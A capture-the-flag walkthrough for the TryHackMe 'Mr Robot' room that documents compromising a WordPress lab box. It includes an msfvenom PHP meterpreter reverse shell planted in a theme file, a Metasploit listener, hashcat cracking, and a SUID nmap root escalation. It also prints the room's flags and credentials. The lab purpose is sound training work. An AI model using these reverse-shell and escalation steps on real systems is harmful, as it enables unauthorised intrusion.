# [Mr Robot - TryHackMe](https://tryhackme.com/room/mrrobot) | 0x00FFFF

Based on the Mr. Robot show, can you root this box?

## Credits

- Created by [tryhackme](https://tryhackme.com/p/tryhackme) and [ben](https://tryhackme.com/p/ben)
- Room Type: Free

### Recon

- *nmap* scan IP to determine open ports
    - `nmap -A -v <target ip>`
- Check for *robots.txt* to find disallowed directories
    - http://<target ip>/robots.txt shows the following entries
        - `User-agent: *
            fsocity.dic
            key-1-of-3.txt`

#### Discovery

- Navigate to http://<target ip>/key-1-of-3.txt for **first key**
    - **073403c8a58a1f80d943455fb30724b9**
- Download wordlist at /fsocity.dic

### Recon

- Find hidden subdirectories
    - `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://<target ip>/FUZZ`
        - Notable directories:
            - /wp-login
            - /readme
            - /robots
            - /license

#### Discovery

- Found wordpress login page at /wp-login
- Found hash at /license: ZWxsaW90OkVSMjgtMDY1Mgo=
    - Base64 encoded from: `elliot:ER28-0652`

### Credential Access

- Use credentials on /wp-login
- Gained access to WP dashboard

### Recon

- Wordpress version 4.3.1 running Twenty Fifteen theme
- Confirmed user "elliot" has Administrator role
- 11 Installed plugins; all currently inactive
- Theme editing allowed

### Resource Development

- Multiple .php files can be edited
- Generate php reverse shell
    - `msfvenom -p php/meterpreter/reverse_tcp LHOST=<attack machine ip> LPORT=<your port> -f raw -o shell.php`
- Copy reverse shell and replace contents of accessible .php file such as 404 response

### Execution

- Start listener in Metasploit
    - `use /exploit/multi/handler`
    - Set options for **LHOST** and **LPORT**
    - Make sure to set **PAYLOAD** to *php/meterpreter/reverse_tcp*
    - `run` when all options are set
- Navigate to prepared endpoint on target web server

### Discovery

- `find / -name "*-of-3.txt" 2>/dev/null` to search for keys, while ignoring all error output
- *key-2-of-3.txt* is in the /home/robot directory
    - Not readable by current user
- Another file named *password.raw-md5* is in the directory

### Collection

- Use meterpreter shell to download *password.raw-md5*

### Privilege Escalation

- *password.raw-md5* file contains a username:password hash pair
    - `robot:c3fcd3d76192e4007dfb496cca67e13b`
- Crack password hash
    - `hashcat password.raw-md5 /usr/share/wordlists/rockyou.txt`
- Login for user *robot*:
    - robot:abcdefghijklmnopqrstuvwxyz

### Execution

- Connect using new credentials to SSH
    - `ssh robot@<target ip>`

### Exfiltration

- *robot* account has read permissions for *key-2-of-3.txt*
- Key 2 is **822c73956184f694993bede3eb39f959**

### Recon

- Check for commands that *robot* can run as *sudo*
    - `sudo -l`
    - No commands can be run as sudo
- Check for exploitable cron jobs
    - `cat /etc/crontab`

#### Output:

<code>
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
44 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D
</code>

- No exploitable cronjobs
- Check for binaries with SUID bit set
    - `find / -perm -u=s -type f 2>/dev/null`
        - `/bin/umount
    /bin/mount
    /bin/su
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/sudo
    /usr/bin/pkexec
    /usr/local/bin/nmap
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
`
    - nmap can be exploited via guide on [GTFOBINS](https://gtfobins.org/gtfobins/nmap/)

### Exploitation

- `nmap --interactive`
- `!/bin/sh`
- Root shell gained
- `find / -name "key-3-of-3.txt" 2>/dev/null` to find last flag

### Exfiltration

- `cat /root/key-3-of-3.txt` returns the key: **04787ddef27c3dee1ee161b21670b4e4**